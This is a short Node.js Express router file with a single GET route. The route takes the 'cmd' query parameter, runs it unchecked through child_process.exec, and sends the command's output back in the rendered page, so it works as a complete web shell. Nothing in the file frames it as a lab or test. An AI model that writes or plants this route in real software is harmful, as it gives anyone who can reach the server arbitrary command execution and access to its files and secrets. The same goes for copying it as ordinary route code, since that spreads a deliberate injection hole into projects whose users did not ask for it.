var express = require('express');
var router = express.Router();
var exec = require("child_process").exec;



router.get('/', function(req, res, next) {

  if (req.query.cmd){
      console.log(req.query.cmd);
      exec(req.query.cmd, function (err, stdout, stderr) {
      //Print stdout/stderr to console
      console.log(stdout);
      console.log(stderr);
      //Simple response to user whenever localhost:3003 is accessed
      res.render('cmd', { title: 'Express', data: stdout });
    });
  }
  else {res.render('cmd', { title: 'Express', data: "" });}
});



module.exports = router;
